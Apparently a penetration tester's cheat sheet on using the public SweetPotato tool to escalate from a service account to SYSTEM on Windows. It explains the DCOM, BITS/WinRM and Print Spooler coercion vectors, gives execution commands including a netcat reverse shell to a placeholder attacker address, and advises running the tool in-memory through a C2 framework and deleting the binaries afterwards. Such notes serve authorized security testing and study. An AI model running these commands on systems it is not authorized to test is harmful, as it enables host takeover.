---
created: 2026-07-21
updated: 2026-09-20
tags:
  - Windows
  - Windows_PrivEsc
status: incomplete
---
> [!abstract]+ **Scope**: Local Windows privilege escalation using the SweetPotato exploit framework; multi-vector execution, BITS/WinRM local listener binding, automated technique selection across Windows 7 through Windows Server 2019+.

- [ ] Confirm `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` via `whoami /priv`.
- [ ] Transfer `SweetPotato.exe` or prepare for reflective C2 `execute-assembly` execution.
- [ ] Execute `SweetPotato.exe` specifying target program and parameter flags.
- [ ] Confirm execution as `NT AUTHORITY\SYSTEM`.
## SweetPotato

- SweetPotato consolidates multiple privilege escalation techniques into a single .NET binary, automatically evaluating system conditions to select an operational attack vector:

  1. **DCOM NTLM reflection**: On legacy builds (Windows 7 / Server 2008 R2 / Server 2012 / Server 2016), SweetPotato uses DCOM activation and local TCP listener reflection similar to [[🛠️ JuicyPotato]].
  2. **BITS and WinRM local listener abuse**: On Windows 10 `1809`+ and Server 2019, SweetPotato triggers the Background Intelligent Transfer Service (BITS) COM object. Upon startup, BITS attempts an authenticated HTTP connection to the local WinRM service on TCP port `5985`. If WinRM is stopped, SweetPotato binds to port `5985`, captures the `SYSTEM` NTLM authentication, and impersonates the caller.
  3. **Print Spooler named pipe coercion**: SweetPotato integrates MS-RPRN named pipe coercion similar to [[PrintSpoofer]] when the Print Spooler service is active.

> [!important] The BITS/WinRM attack vector requires TCP port `5985` to be free. If WinRM is already active (standard on Windows Server builds), SweetPotato falls back to DCOM or Print Spooler coercion.

## Gathering prerequisite information

- Check active user privileges:

```powershell
whoami /priv
```

## Local privilege escalation via SweetPotato

- Download the `SweetPotato.exe` binary on your attacker machine:

```bash
wget https://github.com/CCob/SweetPotato/releases/download/v2.0.0/SweetPotato.exe
```

- Execute a command string as `SYSTEM`:

```powershell
SweetPotato.exe -p cmd.exe -a "/c whoami"
```

- Launch a reverse shell command:

```powershell
SweetPotato.exe -p cmd.exe -a "/c C:\Windows\Temp\nc.exe <attacker_ip_address> 4444 -e cmd.exe"
```

### Command parameter reference

| Option | Description |
| :--- | :--- |
| `-p` | Path to target executable file launched under the `SYSTEM` primary token. |
| `-a` | Argument string passed directly to the program specified in `-p`. |

### Scenario decision guide

| Operating environment | Recommended exploit |
| :--- | :--- |
| Legacy builds (≤ Windows 10 `1803` / Server 2016) | [[🛠️ JuicyPotato]] |
| Active Print Spooler service (`spoolsv.exe`) | [[PrintSpoofer]] |
| Accessible external listener on TCP port 135 | [[RoguePotato]] |
| Modern standalone host without dependencies | [[GodPotato]] |

## Troubleshooting

- WinRM port `5985` is in use
  - WinRM service is already running on target server; SweetPotato automatically falls back to DCOM or Print Spooler coercion.
- Token acquisition failure
  - Current session token lacks `SeImpersonatePrivilege`; verify assigned privileges via `whoami /priv`.

> [!tip]+
> - Execute `whoami` to verify `NT AUTHORITY\SYSTEM` context upon shell execution.
> - Use SweetPotato primarily when executing in-memory through C2 frameworks (such as Cobalt Strike `execute-assembly`). For manual command-line operation, standalone binaries like [[PrintSpoofer]] or [[GodPotato]] offer direct control.
> - Remove transferred binaries (`SweetPotato.exe`, `nc.exe`) from the target host upon task completion.

## References and further reading

- [`SweetPotato — GitHub (CCob)`](https://github.com/CCob/SweetPotato)
- [`We thought they were potatoes but they were beans — Decoder's Blog`](https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/)
- [`Windows Privilege Escalation — Potatoes — Jorge Lajara`](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
